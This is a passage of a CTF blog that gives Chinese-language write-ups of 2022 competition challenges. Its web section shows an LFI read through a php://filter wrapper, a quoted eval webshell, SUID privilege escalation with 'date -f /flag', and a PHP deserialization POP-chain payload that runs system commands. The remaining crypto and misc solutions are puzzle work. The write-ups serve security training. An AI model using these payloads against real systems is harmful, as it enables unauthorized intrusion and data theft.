2022HECTF调查问卷写问卷得flag。","categories":[{"name":"match","slug":"match","permalink":"https://lazzzaro.github.io/categories/match/"}],"tags":[{"name":"2022赛","slug":"2022赛","permalink":"https://lazzzaro.github.io/tags/2022%E8%B5%9B/"}],"author":"Lazzaro"},{"title":"2022年羊城杯网络安全大赛","slug":"match-2022年羊城杯网络安全大赛","date":"2022-09-04T05:46:20.000Z","updated":"2022-09-04T13:50:35.327Z","comments":true,"path":"2022/09/04/match-2022年羊城杯网络安全大赛/","link":"","permalink":"https://lazzzaro.github.io/2022/09/04/match-2022%E5%B9%B4%E7%BE%8A%E5%9F%8E%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B/","excerpt":"","text":"​ 大赛由中共广州市委网络安全和信息化委员会办公室作为指导单位，广州市网络安全产业促进会主办，广东外语外贸大学、杭州安恒信息技术股份有限公司承办，广州市信息安全测评中心、广州互联网协会协办。 大赛以“网络安全为人民、网络安全靠人民”为主题，旨在通过竞赛的方式提高参赛选手攻防兼备的网络安全实践技能，实现以赛促学、以赛会友，加强不同院校及单位间的技术交流。 本届大赛由【广外女生战队】与杭州安恒信息技术股份有限公司共同命题，采用CTF（夺旗赛）团队竞赛模式，参赛队伍通过互联网在线解题，题目类型涉及Web安全、逆向工程 (Reverse)、二进制漏洞挖掘和利用（Pwn）、密码学（Crypto）、杂项（Misc）等类别。 比赛时间：9月3日 9:00 - 9月4日 9:00 WEBrce_me 简单web 1234567891011121314151617&lt;?php(empty($_GET[&quot;file&quot;])) ? highlight_file(__FILE__) : $file=$_GET[&quot;file&quot;];function fliter($var): bool&#123; $blacklist = [&quot;&lt;&quot;,&quot;?&quot;,&quot;$&quot;,&quot;[&quot;,&quot;]&quot;,&quot;;&quot;,&quot;eval&quot;,&quot;&gt;&quot;,&quot;@&quot;,&quot;_&quot;,&quot;create&quot;,&quot;install&quot;,&quot;pear&quot;]; foreach($blacklist as $blackword)&#123; if(stristr($var, $blackword)) return False; &#125; return True;&#125; if(fliter($_SERVER[&quot;QUERY_STRING&quot;]))&#123;include $file;&#125;else&#123;die(&quot;Noooo0&quot;);&#125; 非预期。Dirsearch扫一下发现他人上传的shell.php，利用file参数include+伪协议包含一下： ?file=php://filter/read=convert.base64-encode/resource=shell.php base64解码得到源码：&lt;?php @eval($_POST[a]);?&gt; 用蚁剑连接上，在根目录下发现flag，但是权限不够无法查看。 find / -user root -perm -4000 -print 2&gt;/dev/null 查看具有SUID权限的可执行文件，发现date命令可用，提权： date -f /flag 在报错文字中获取flag内容。 ​ Safepop Wake up!Pop corn is not safe food, 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849&lt;?phperror_reporting(E_ALL);ini_set(&#x27;display_errors&#x27;, true);highlight_file(__FILE__);class Fun&#123; private $func = &#x27;call_user_func_array&#x27;; public function __call($f,$p)&#123; call_user_func($this-&gt;func,$f,$p); &#125; public function __wakeup()&#123; $this-&gt;func = &#x27;&#x27;; die(&quot;Don&#x27;t serialize me&quot;); &#125;&#125;class Test&#123; public function getFlag()&#123; system(&quot;cat /flag?&quot;); &#125; public function __call($f,$p)&#123; phpinfo(); &#125; public function __wakeup()&#123; echo &quot;serialize me?&quot;; &#125;&#125;class A&#123; public $a; public function __get($p)&#123; if(preg_match(&quot;/Test/&quot;,get_class($this-&gt;a)))&#123; return &quot;No test in Prod\\n&quot;; &#125; return $this-&gt;a-&gt;$p(); &#125;&#125;class B&#123; public $p; public function __destruct()&#123; $p = $this-&gt;p; echo $this-&gt;a-&gt;$p; &#125;&#125;if(isset($_GET[&#x27;pop&#x27;]))&#123; $pop = $_GET[&#x27;pop&#x27;]; $o = unserialize($pop); throw new Exception(&quot;no pop&quot;);&#125; 找反序列化pop链： Test/getFlag() &lt;- A/__get($p) &lt;- B/__destruct() 由于类A存在过滤 preg_match(&quot;/Test/&quot;,get_class($this-&gt;a))，类A不能调类Test，利用上类Fun： Fun/__call($f,$p) &lt;- A/__get($p) &lt;- B/__destruct() 编写脚本： 1234567891011121314151617181920from phpserialize import serializefrom urllib.parse import * class Test: pass class Fun: private_func = &#x27;system&#x27; class A: public_a = Fun() class B: # public_p = &#x27;ls /&#x27; public_p = &#x27;cat /flag?&#x27; public_a = A() print(quote(serialize(B())))# O%3A1%3A%22B%22%3A2%3A%7Bs%3A1%3A%22a%22%3BO%3A1%3A%22A%22%3A1%3A%7Bs%3A1%3A%22a%22%3BO%3A3%3A%22Fun%22%3A1%3A%7Bs%3A9%3A%22%00Fun%00func%22%3Bs%3A6%3A%22system%22%3B%7D%7Ds%3A1%3A%22p%22%3Bs%3A10%3A%22cat%20/flag%3F%22%3B%7D 由于类Fun有 __wakeup() 会清空 private $func，修改数字绕过 __wakeup()： O%3A1%3A%22B%22%3A3%3A%7Bs%3A1%3A%22a%22%3BO%3A1%3A%22A%22%3A1%3A%7Bs%3A1%3A%22a%22%3BO%3A3%3A%22Fun%22%3A1%3A%7Bs%3A9%3A%22%00Fun%00func%22%3Bs%3A6%3A%22system%22%3B%7D%7Ds%3A1%3A%22p%22%3Bs%3A10%3A%22cat%20/flag%3F%22%3B%7D 传入pop参数得到flag。 ​ MISCwhere_is_secret easy_misc 一个vig.txt和一个zip压缩包，txt中文字 Naseu bybkjkl, O wt mna Wkkopwkja hl Qrkgeux Fasxtorr. Zdl Kaozbgj hksu oty fblz hhntyoxj wu tzphvq ku Nqnhbta, hgj pox Qupo geyiuna ago ixkj jhtpyhrhlw hu aak Nblyehg gntr. Nahkj pvwgu pl QBJ Vxwgr Zdbkyzhr, O jlxj ovfkkux zk ikojn fk 29.94 bpgmay-layrbtc vkocpggh jaoyrxt wz kgpphto uhc. Soxt E yxvas mna Ynyoptt wyfe, E dbrh pgbeax ekb mu yvfk pv Nqnhbta ah ha aak rpvk lyxyekxtp.aak lhlysvkj ez ZCDA@K1tz0frjo 使用在线维吉尼亚密码解密网站解出明文： Hello friends, I am the President of Ukraine Zelensky. The Russian army has just launched an attack on Ukraine, and the Kyiv airport has been controlled by the Russian army. Heard today is KFC Crazy Thursday, I need someone to bring me 29.94 finger-sucking original chicken as rations now. When I repel the Russian army, I will invite you to come to Ukraine to be the vice president.the password is GWHT@R1nd0yyds 用密码 GWHT@R1nd0yyds 解压zip，得到一张bmp图，根据比赛中期放的hint提示加密脚本： 12345678910111213141516171819202122232425262728from PIL import Imageimport mathdef encode(text): str_len = len(text) width = math.ceil(str_len ** 0.5) im = Image.new(&quot;RGB&quot;, (width, width), 0x0) x, y = 0, 0 for i in text: index = ord(i) rgb = (0, (index &amp; 0xFF00) &gt;&gt; 8, index &amp; 0xFF) im.putpixel((x, y), rgb) if x == width - 1: x = 0 y += 1 else: x += 1 return imif __name__ == &#x27;__main__&#x27;: with open(&quot;829962.txt&quot;, encoding=&quot;gbk&quot;) as f: all_text = f.read() im = encode(all_text) im.save(&quot;out.bmp&quot;) 通过爆破方法逆回原文本即可，发现原文为一本书，包含大量中文，还原时设置不输出中文，缩短运行时间： 123456789101112131415161718192021222324252627from PIL import Imageimg = Image.open(r&#x27;out.bmp&#x27;)width, height = img.sizetext=&#x27;&#x27;x, y = 0, 0for i in range(200000): try: r,g,b = img.getpixel((x,y)) for j in range(126): if ((j &amp; 0xFF00) &gt;&gt; 8) == g and j &amp; 0xFF == b: text+=chr(j) break else: pass if x == width - 1: x = 0 y += 1 else: x += 1 except: breakprint(x,y)open(r&#x27;text.txt&#x27;,&#x27;w&#x27;).write(text) 在得到的字符里，找到flag格式的且带有意义的字符，组成flag：flag&#123;h1d3_1n_th3_p1ctur3&#125;。 ​ 迷失幻境 走不出自责空间，沉溺于我们昨天，还能不能相见。 用DiskGenius打开vmdk文件，在回收站发现一张可莉jpg图片和一张无文件类型后缀的幻境png图片，提取出来。 在“迷失幻境”夹子里有1张可莉jpg图片和100张一样的幻境png图片，前后相同图片的大小不同，尝试盲水印提取信息不成功，再尝试将幻境png大图与小图进行减（sub）操作，得到 key为 可莉前来报道。 回收站里可莉jpg图片存在备注信息 猜不到，怎么想都猜不到吧。，用outguess提取： outguess -r keli.jpg -k &quot;可莉前来报道&quot; -t out.txt 得到flag：DASCTF&#123;f473a6fd2de17a0c5794414b3905ebbe&#125;。 ​ 签个到 签个到，请注意，本次比赛所有 flag 提交时都只需要提交括号内的字符串，比如这个题的 flag 如果是 flag{xxx}, 您只需要提交 xxx 即可得分。 ZMJTPM33TIGQTLMDTV4JXLYQTNMQTAOLTSGTRMOLZD2JPMOETIEQBZ3PTZ2U2===，初看为base32，解码为乱码。 flag&#123; 对应base32编码为 MZWGCZ33，故为rot13+base32，解码得 flag&#123;5f3c029eac023481fbd8d5ad15b73b34&#125;。 ​ CRYPTOLRSA RSA and some other things 1234567891011121314151617181920212223242526from Crypto.Util.number import *import gmpy2from flag import flagm=bytes_to_long(flag)def getPQ(p,q): P=getPrime(2048) Q=getPrime(2048) t=(p*P-58*P+q)%Q assert (isPrime(Q)) return P,Q,tB=getRandomNBitInteger(11)p=getPrime(B)q=getPrime(B)n=p*qe=65537c=pow(m,e,n)P,Q,t=getPQ(p,q)print(&quot;B=&quot;,B)print(&quot;P*P*Q=&quot;,P*P*Q)print(&quot;P*Q*Q=&quot;,P*Q*Q)print(&quot;t=&quot;,t)print(&quot;c=&quot;,c) $\\gcd(P \\cdot P \\cdot Q,P \\cdot Q \\cdot Q)=P \\cdot Q$，继而求得 $P$ 和 $Q$，又有 $t=(P \\cdot(p-58)+q) \\bmod Q$，构造格 $\\begin{bmatrix} 1 &amp; P \\newline 0 &amp; Q \\end{bmatrix}$，利用LLL算法规约得到 $p-58$ 和 $q$ 值。 123456789101112131415161718192021222324B = 1023PPQ = 17550772391048142376662352375650397168226219900284185133945819378595084615279414529115194246625188015626268312188291451580718399491413731583962229337205180301248556893326419027312533686033888462669675100382278716791450615542537581657011200868911872550652311318486382920999726120813916439522474691195194557657267042628374572411645371485995174777885120394234154274071083542059010253657420242098856699109476857347677270860654429688935924519805555787949683144015873225388396740487817155358042797286990338440987035608851331840925854381286767024584195081004360635842976624747610461507795755042915965483135990495921912997789567020652729777216671481467049291624343256152446367091568361258918212012737611001009003078023715854575413979603297947011959023398306612437250872299406744778763429172689675430968886613391356192380152315042387148665654062576525633130546454743040442444227245763939134967515614637300940642555367668537324892890004459521919887178391559206373513466653484926149453481758790663522317898916616435463486824881406198956479504970446076256447830689197409184703931842169195650953917594642601134810084247402051464584676932882503143409428970896718980446185114397748313655630266379123438583315809104543663538494519415242569480492899140190587129956835218417371308642212037424611690324353109931657289337536406499314388951678319136343913551598851601805737870217800009086551022197432448461112330252097447894028786035069710260561955740514091976513928307284531381150606428802334767412638213776730300093872457594524254858721551285338651364457529927871215183857169772407595348187949014442596356406144157105062291018215254440382214000573515515859668018846789551567310531570458316720877172632139481792680258388798439064221051325274383331521717987420093245521230610073103811158660291643007279940393509663374960353315388446956868294358252276964954745551655711981PQQ = 17632503734712698604217167790453868045296303200715867263641257955056721075502316035280716025016839471684329988600978978424661087892466132185482035374940487837109552684763339574491378951189521258328752145077889261805000262141719400516584216130899437363088936913664419705248701787497332582188063869114908628807937049986360525010012039863210179017248132893824655341728382780250878156526086594253092249935304259986328308203344932540888448163430113818706295806406535364433801544858874357459282988110371175948011077595778123265914357153104206808258347815853145593128831233094769191889153762451880396333921190835200889266000562699392602082643298040136498839726733129090381507278582253125509943696419087708429546384313035073010683709744463087794325058122495375333875728593383803489271258323466068830034394348582326189840226236821974979834541554188673335151333713605570214286605391522582123096490317734786072061052604324131559447145448500381240146742679889154145555389449773359530020107821711994953950072547113428811855524572017820861579995449831880269151834230607863568992929328355995768974532894288752369127771516710199600449849031992434777962666440682129817924824151147427747882725858977273856311911431085373396551436319200582072164015150896425482384248479071434032953021738952688256364397405939276917210952583838731888536160866721278250628482428975748118973182256529453045184370543766401320261730361611365906347736001225775255350554164449014831203472238042057456969218316231699556466298168668958678855382462970622819417830000343573014265235688391542452769592096406400900187933156352226983897249981036555748543606676736274049188713348408983072484516372145496924391146241282884948724825393087105077360952770212959517318021248639012476095670769959011548699960423508352158455979906789927951812368185987838359200354730654103428077770839008773864604836807261909t = 44c = 4364802217291010807437827526073499188746160856656033054696031258814848127341094853323797303333741617649819892633013549917144139975939225893749114460910089509552261297408649636515368831194227006310835137628421405558641056278574098849091436284763725120659865442243245486345692476515256604820175726649516152356765363753262839864657243662645981385763738120585801720865252694204286145009527172990713740098977714337038793323846801300955225503801654258983911473974238212956519721447805792992654110642511482243273775873164502478594971816554268730722314333969932527553109979814408613177186842539860073028659812891580301154746e = 65537PQ = gcd(PPQ,PQQ)P = PPQ//PQQ = PQQ//PQprint(P)print(Q)A = Matrix(ZZ,[[1,P],[0,Q]])x = A.LLL()[0][0]p = -x+58q = (t-P*(p-58))%Qf = (p-1)*(q-1)d = inverse_mod(e,f)m = pow(c,d,p*q)print(bytes.fromhex(hex(m)[2:]))# b&#x27;DASCTF&#123;8f3djoj9wedj2_dkc903cwckckdk&#125;&#x27; ​ EasyRsa really easy rsa 1234567891011121314151617from flag import flagfrom Crypto.Util.number import *m = bytes_to_long(flag)e = 65537f = open(&quot;output.txt&quot;, &quot;r&quot;)a = f.readlines()for i in a: n = int(i) c = pow(m, e, n) m = cprint &#x27;c = %s&#x27; % (m)f.close()&#x27;&#x27;&#x27;c = 38127524839835864306737280818907796566475979451567460500065967565655632622992572530918601432256137666695102199970580936307755091109351218835095309766358063857260088937006810056236871014903809290530667071255731805071115169201705265663551734892827553733293929057918850738362888383312352624299108382366714432727&#x27;&#x27;&#x27; gcd测试发现output中的 $n$ 有素公因子 $p$，逆推还原 $m$ 即可： 1234567891011121314n = [65439077968397540989065489337415940784529269429684649365065378651353483030304843439003949649543376311871845618819107350646437252980144978447924976470943930075812834237368425374578215977641265884859875440799334807607478705932175148673160353577875890074101393042506714001617338265284910381849259298772642190619,86843235426823545017422014398916780909062053456790256392304973548517489132984667679637386416948409930796162377844525829968317585749956057149930523547463230147376192820753802868362225137830225967953826475779047454555958271846035526319036389127587352017149417549187850782892924691511398536178090031958365483499,57839320383142814687522363258949714784622321678585619281948174372461045134361003939684803510572969567182690634502610963365500727981041136988638273942465134797850643121827808482673619534240872593224537996099454035648829692386918230535360101064254854063175494150147494342652670585674593236663514793256521719547,52668168898129361356420333177679019946307853075463961068071790653159090226904625885080236174231665178538405547828768043706515464922611051221394704678558922339886480247663138702481349098077291584992082414494275463670330534613607852999291645500391111597009868188974671249118213040057429113174377610094956993269,79875848044631194160351918105738804229446748736206976033243436373010695259945613104837645712048695514204494137005015770637421510392760763371639480133851920449252506525423837434811693638210458851990502785655738042348115385964604080872180121543147063180945532713593712726527002909054818485584237993215139630243,73100501797447180147684637554796375398455002202770022931512541062214916136294604754404667725341796896161398464327153718845280194035978972665664657052946003418121755545770123205426883869361411412259838522099085901563107814985172942977520233320215882707710717870398128412272218474014381169303848087621856187879,89149546555397759430343098936690138982544367561661914051499112345535238108800665531588376806546499374457634397161670140520060064963391826220177798442707381640723248034061313974522233415815795656570220902974484865176728535660627712374835329967608728216749734529761431592345816592875807318876347151421393671763,66449107450661172442868032153863675098235855689218695279414435182923510356012957155941548483160873271040452368644926703812707864779900715051152673705082002761445847561495295455460041902473282731259268870375921215589157288622757488879539441498396276257589120302991242300378364101246448094955634459779361686643,79694880331320743031437708811856697413105291652061062223857313580221562305807771003185061831752133665835648647560103986928466217390444724672894866216636981793418219455653595717274553950715056120806463449033181486699963584346517910081706586345546292894426402568226579894766693070066214488743160957135286739213,70521001788476157145543175674209083194325853388116385624440232036679708917857095748070597575068955423165296665429648694541353249787337464272095260410717659726012806836884799476995758902361678737968193674368688353935424186389207123637734230550266810766585903134004322848985320790788169777840924595645463787189,51801430118171456966246071852561156183140136541960623661080056673664466785669585092926482194691254461430866302262960624015915371927788809661387318097968209364907625599562339722700041444342116899266802018340155635959614677597708758012024981583143521259152639480003228924151971208695043251548758407218187895663,87310111118839703578797261862424304499548882114635944516216618095145194843718635007052242072452831460162126955481326379219639313067967998826898344673513019946299427614605216960081461930080199023399060417820769438661351988322185620598552697590115678078498754112860310272842870106790357443602405008865116282919]e = 65537p = 7552850543392291177573335134779451826968284497191536051874894984844023350777357739533061306212635723884437778881981836095720474943879388731913801454095897c = 38127524839835864306737280818907796566475979451567460500065967565655632622992572530918601432256137666695102199970580936307755091109351218835095309766358063857260088937006810056236871014903809290530667071255731805071115169201705265663551734892827553733293929057918850738362888383312352624299108382366714432727for i in range(len(n)-1,-1,-1): q = int(n[i]//p) f = (p-1)*(q-1) d = inverse_mod(e,f) c = int(pow(c,d,n[i])) print(bytes.fromhex(hex(c)[2:]))# b&#x27;GWHT&#123;gixkJl7SJTcpLOL9zqwo&#125;&#x27; ​ Solomen’s puzzle 1 F1ower做梦梦见了Reed和Solomen，他们告诉了F1ower财富密码，但是F1ower记错了几个字节。。请将最终得到的完整flag(包含DASCTF{})进行MD5后再提交，即提交：&quot;DASCTF&#123;%s&#125;&quot; % md5(flag.encode()).hexdigest() 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455# type: ignorem = 257F = Zmod(m)alpha = F(223)PR.&lt;x&gt; = PolynomialRing(F)gx = (x - alpha ^ 0) * (x - alpha ^ 1) * (x - alpha ^ 2) * (x - alpha ^ 3)def encode_block(message): assert isinstance(message, list) f = PR([0] * 4 + message) px = f % gx mx = f - px c = [_ for _ in mx] return c + (8 - len(c)) * [0]def encode(byte_stream): length = len(byte_stream) if length % 4 != 0: padding = (length // 4 + 1) * 4 - length byte_stream += padding * b&#x27;\\x00&#x27; length += padding code = b&#x27;&#x27; for i in range(0, length, 4): block = byte_stream[i:i+4] block_code = encode_block([each for each in block]) code += bytes(block_code) return codefrom secret import flag, p, qfrom Crypto.Util.number import bytes_to_long, long_to_bytesfrom random import randrangen = p * qe = 10632528934906371807995216845027219767890923967559690651733628659750564299493611010425615580946665632019547006685100876646048602773295571936276450835367591cipher = bytes_to_long(flag) * e % ncode = encode(long_to_bytes(cipher))code = [each for each in code]for i in range(0, 256, 8): index1 = randrange(4, 8) value1 = randrange(0, 256) index2 = randrange(4, 8) value2 = randrange(0, 256) code[i + index1] = value1 code[i + index2] = value2print(n)print(bytes(code)) 将 $m$ 通过 $me\\%n$ 计算得 $c$，再按4长度分块通过 encode_block() 加密得到密文，每块密文长度为8，前4长度为密文值，后4长度为加密前值，再将后4长度加密前值的一或二位内容随机设置为随机值。 提取关键加密函数： 1234567891011121314m = 257F = Zmod(m)alpha = F(223)PR.&lt;x&gt; = PolynomialRing(F)gx = (x - alpha ^ 0) * (x - alpha ^ 1) * (x - alpha ^ 2) * (x - alpha ^ 3)def encode_block(message): assert isinstance(message, list) f = PR([0] * 4 + message) px = f % gx mx = f - px c = [_ for _ in mx] return c + (8 - len(c)) * [0] 多项式运算 $px=f\\%gx$，$mx=f-px$，故 $f$ 与 $mx$ 是一一对应的，可由 $mx$ 恢复原 $f$。 利用sage多项式计算功能，可以推导 $f$ 与 $mx$ 关系： 123456789101112#m = 257#F = Zmod(m)alpha = 223PR.&lt;x,a,b,c,d&gt; = PolynomialRing(Zmod(257))gx = (x - alpha ^ 0) * (x - alpha ^ 1) * (x - alpha ^ 2) * (x - alpha ^ 3)f = d*x^7 + c*x^6 + b*x^5 + a*x^4px = f % gxmx = f - pxprint(mx)# x^7*d + x^6*c + x^5*b + x^4*a + 145*x^3*a + 233*x^3*b + 82*x^3*c + 73*x^3*d + 184*x^2*a + 200*x^2*b + 141*x^2*c + 111*x^2*d + 152*x*a + 94*x*b + 36*x*c + 126*x*d + 32*a + 243*b + 254*c + 203*d 根据对应关系，利用Gröbner基求解四元模方程组，再分组还原后4长度为加密前值： 123456789101112131415161718192021222324252627282930313233343536from hashlib import md5m = 257F = Zmod(m)alpha = 223PR.&lt;x&gt; = PolynomialRing(F)gx = (x - alpha ^ 0) * (x - alpha ^ 1) * (x - alpha ^ 2) * (x - alpha ^ 3)def calLast(v): P.&lt;a,b,c,d&gt; = PolynomialRing(Zmod(257)) f0 = 32*a + 243*b + 254*c + 203*d - v[0] f1 = 152*a + 94*b + 36*c + 126*d - v[1] f2 = 184*a + 200*b + 141*c + 111*d - v[2] f3 = 145*a + 233*b + 82*c + 73*d - v[3] G = Ideal([f0, f1, f2, f3]).groebner_basis() m = [] for b in G: mi = ZZ(-b(0, 0, 0, 0)) m.append(mi) return me = 10632528934906371807995216845027219767890923967559690651733628659750564299493611010425615580946665632019547006685100876646048602773295571936276450835367591n = 94257413713770111563970534929325680923943690882102478219183863722026590313165304301118258536360712467357451726680293716779730218553691126214750969333228034756948476572806064756873382054384808713137658321644158757777088916851366208046581218865015163572359836440643828462291397248680038931998325006839692797347c = list(b&#x27;\\xb9$5.&gt;\\xff\\xe3S\\xc91\\xb2\\xeb\\x1byR(\\x12&#123;\\xc4\\xbf\\xa4wo|\\xc5-;\\xc9\\xc9S[\\xaeX\\xad\\xf0\\xef@\\x1c\\x87]\\x9a\\xb9:\\x8cu\\xa5\\xe3EA&lt;&quot;\\xfd\\x9a\\xbfqB\\x94\\xc3R\\x95\\xd5\\xbd\\xd0\\x10u\\x10\\xe3\\xa5&quot;S\\xed\\xd0\\xf8\\x02\\xbf\\x124A~1]\\xceP\\xdf\\xf2Cr1\\x93\\xacw\\x03\\tQe\\xcc2b\\xbf\\x0f\\x92\\xad\\x19\\x00\\xab|\\xf3\\xc9\\x9b&amp;I%\\xf5\\x9b#\\xf7\\xa2\\xcb\\xb1\\x0c\\xee\\xb56\\xd5\\xd2\\xd5[?^\\x9d\\x8b\\x93\\xbe\\x832\\xee\\xa9\\xa5\\x83$\\xe9\\xe5\\x95\\x01\\xd6\\x9f\\xad\\x1f\\x90\\xc3]aL\\x10\\x07&#123;#4i^\\xae\\xdf|\\x9f\\x94\\xf4\\xaf\\x06R\\x86j&amp;\\xeb\\x0b\\x06\\xcf\\xb2\\x8e\\xb4\\xb9s\\x97[\\xf1ip\\x06\\xf8\\xfdFs\\xf1`\\xc6\\x82\\xd8\\xce\\xf6\\x95&#123;\\xe3\\x8cQ\\xed\\xef\\xe9\\xb9\\&#x27;\\x19\\xdf^\\xc8\\x81\\xde\\x1fQ\\x1e\\x86\\xda\\xf8\\xfd4M0#\\xef\\x8a\\xe9\\xe5\\xfc\\xe2\\xe3\\xe6\\xd0e\\xce\\xe1\\x0b\\x9eM\\x07\\xc2Y\\xf8B\\xe1\\xde\\xfaP\\xe9\\x9d\\xde\\xc3\\xe3C\\xa5&#x27;)ori_c = []for i in range(0, len(c), 8): block = c[i:i+8] ori_c += calLast(c[i:i+4])c = int(bytes(ori_c).hex(),16)m = int(bytes(ori_c).hex(),16)*inverse_mod(e,n)%nflag = bytes.fromhex(hex(m)[2:])print(&quot;DASCTF&#123;%s&#125;&quot; % md5(flag).hexdigest())# DASCTF&#123;4e4fc02d88b0c8f66c924489e1bf58ea&#125;","categories":[{"name":"match","slug":"match","permalink":"https://lazzzaro.github.io/categories/match/"}],"tags":[{"name":"2022赛","slug":"2022赛","permalink":"https://lazzzaro.github.io/tags/2022%E8%B5%9B/"}],"author":"Lazzaro"},{"title":"NepCTF 2022","slug":"match-NepCTF-2022","date":"2022-07-17T13:18:30.000Z","updated":"2022-07-17T16:14:32.991Z","comments":true,"path":"2022/07/17/match-NepCTF-2022/","link":"","permalink":"https://lazzzaro.github.io/2022/07/17/match-NepCTF-2022/","excerpt":"","text":"​ “NepCTF 2022”是由Nepnep联合站队主办的公益招新赛事，旨在以有代表性、有特色的题目培养新生网络安全能力。 比赛时间：2022年7月15日10:00 - 2022年7月17日10:00。 比赛形式：个人解题赛 比赛链接：http://nep.lemonprefect.cn/ 比赛平台：Power by CTFm NepCTF 2022赛事说明文档：https://www.wolai.com/nepnep/4c2ZG1UaTnVMmyYsKB5duj Rank: 4 MISC签到题 极限套娃 flag格式为nepctf{} jpg中提取出zip压缩包，zip压缩包套娃232层，用cyberchef label+jump循环提取出最内层的pcap文件； wireshark打开发现为USB键盘流量，tshark工具提取出usb.capdata数据，用脚本还原键位： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465normalKeys = &#123; &quot;04&quot;:&quot;a&quot;, &quot;05&quot;:&quot;b&quot;, &quot;06&quot;:&quot;c&quot;, &quot;07&quot;:&quot;d&quot;, &quot;08&quot;:&quot;e&quot;, &quot;09&quot;:&quot;f&quot;, &quot;0a&quot;:&quot;g&quot;, &quot;0b&quot;:&quot;h&quot;, &quot;0c&quot;:&quot;i&quot;, &quot;0d&quot;:&quot;j&quot;, &quot;0e&quot;:&quot;k&quot;, &quot;0f&quot;:&quot;l&quot;, &quot;10&quot;:&quot;m&quot;, &quot;11&quot;:&quot;n&quot;, &quot;12&quot;:&quot;o&quot;, &quot;13&quot;:&quot;p&quot;, &quot;14&quot;:&quot;q&quot;, &quot;15&quot;:&quot;r&quot;, &quot;16&quot;:&quot;s&quot;, &quot;17&quot;:&quot;t&quot;, &quot;18&quot;:&quot;u&quot;, &quot;19&quot;:&quot;v&quot;, &quot;1a&quot;:&quot;w&quot;, &quot;1b&quot;:&quot;x&quot;, &quot;1c&quot;:&quot;y&quot;, &quot;1d&quot;:&quot;z&quot;,&quot;1e&quot;:&quot;1&quot;, &quot;1f&quot;:&quot;2&quot;, &quot;20&quot;:&quot;3&quot;, &quot;21&quot;:&quot;4&quot;, &quot;22&quot;:&quot;5&quot;, &quot;23&quot;:&quot;6&quot;,&quot;24&quot;:&quot;7&quot;,&quot;25&quot;:&quot;8&quot;,&quot;26&quot;:&quot;9&quot;, &quot;27&quot;:&quot;0&quot;,&quot;28&quot;:&quot;&lt;RET&gt;&quot;,&quot;29&quot;:&quot;&lt;ESC&gt;&quot;,&quot;2a&quot;:&quot;&lt;DEL&gt;&quot;, &quot;2b&quot;:&quot;\\t&quot;, &quot;2c&quot;:&quot;&lt;SPACE&gt;&quot;,&quot;2d&quot;:&quot;-&quot;,&quot;2e&quot;:&quot;=&quot;,&quot;2f&quot;:&quot;[&quot;,&quot;30&quot;:&quot;]&quot;,&quot;31&quot;:&quot;\\\\&quot;, &quot;32&quot;:&quot;&lt;NON&gt;&quot;,&quot;33&quot;:&quot;;&quot;,&quot;34&quot;:&quot;&#x27;&quot;,&quot;35&quot;:&quot;&lt;GA&gt;&quot;,&quot;36&quot;:&quot;,&quot;,&quot;37&quot;:&quot;.&quot;, &quot;38&quot;:&quot;/&quot;,&quot;39&quot;:&quot;&lt;CAP&gt;&quot;,&quot;3a&quot;:&quot;&lt;F1&gt;&quot;,&quot;3b&quot;:&quot;&lt;F2&gt;&quot;, &quot;3c&quot;:&quot;&lt;F3&gt;&quot;,&quot;3d&quot;:&quot;&lt;F4&gt;&quot;, &quot;3e&quot;:&quot;&lt;F5&gt;&quot;,&quot;3f&quot;:&quot;&lt;F6&gt;&quot;,&quot;40&quot;:&quot;&lt;F7&gt;&quot;,&quot;41&quot;:&quot;&lt;F8&gt;&quot;,&quot;42&quot;:&quot;&lt;F9&gt;&quot;,&quot;43&quot;:&quot;&lt;F10&gt;&quot;, &quot;44&quot;:&quot;&lt;F11&gt;&quot;,&quot;45&quot;:&quot;&lt;F12&gt;&quot;&#125;shiftKeys = &#123; &quot;04&quot;:&quot;A&quot;, &quot;05&quot;:&quot;B&quot;, &quot;06&quot;:&quot;C&quot;, &quot;07&quot;:&quot;D&quot;, &quot;08&quot;:&quot;E&quot;, &quot;09&quot;:&quot;F&quot;, &quot;0a&quot;:&quot;G&quot;, &quot;0b&quot;:&quot;H&quot;, &quot;0c&quot;:&quot;I&quot;, &quot;0d&quot;:&quot;J&quot;, &quot;0e&quot;:&quot;K&quot;, &quot;0f&quot;:&quot;L&quot;, &quot;10&quot;:&quot;M&quot;, &quot;11&quot;:&quot;N&quot;, &quot;12&quot;:&quot;O&quot;, &quot;13&quot;:&quot;P&quot;, &quot;14&quot;:&quot;Q&quot;, &quot;15&quot;:&quot;R&quot;, &quot;16&quot;:&quot;S&quot;, &quot;17&quot;:&quot;T&quot;, &quot;18&quot;:&quot;U&quot;, &quot;19&quot;:&quot;V&quot;, &quot;1a&quot;:&quot;W&quot;, &quot;1b&quot;:&quot;X&quot;, &quot;1c&quot;:&quot;Y&quot;, &quot;1d&quot;:&quot;Z&quot;,&quot;1e&quot;:&quot;!&quot;, &quot;1f&quot;:&quot;@&quot;, &quot;20&quot;:&quot;#&quot;, &quot;21&quot;:&quot;$&quot;, &quot;22&quot;:&quot;%&quot;, &quot;23&quot;:&quot;^&quot;,&quot;24&quot;:&quot;&amp;&quot;,&quot;25&quot;:&quot;*&quot;,&quot;26&quot;:&quot;(&quot;,&quot;27&quot;:&quot;)&quot;, &quot;28&quot;:&quot;&lt;RET&gt;&quot;,&quot;29&quot;:&quot;&lt;ESC&gt;&quot;,&quot;2a&quot;:&quot;&lt;DEL&gt;&quot;, &quot;2b&quot;:&quot;\\t&quot;,&quot;2c&quot;:&quot;&lt;SPACE&gt;&quot;, &quot;2d&quot;:&quot;_&quot;,&quot;2e&quot;:&quot;+&quot;,&quot;2f&quot;:&quot;&#123;&quot;,&quot;30&quot;:&quot;&#125;&quot;,&quot;31&quot;:&quot;|&quot;,&quot;32&quot;:&quot;&lt;NON&gt;&quot;,&quot;33&quot;:&quot;\\&quot;&quot;, &quot;34&quot;:&quot;:&quot;,&quot;35&quot;:&quot;&lt;GA&gt;&quot;,&quot;36&quot;:&quot;&lt;&quot;,&quot;37&quot;:&quot;&gt;&quot;,&quot;38&quot;:&quot;?&quot;,&quot;39&quot;:&quot;&lt;CAP&gt;&quot;,&quot;3a&quot;:&quot;&lt;F1&gt;&quot;, &quot;3b&quot;:&quot;&lt;F2&gt;&quot;, 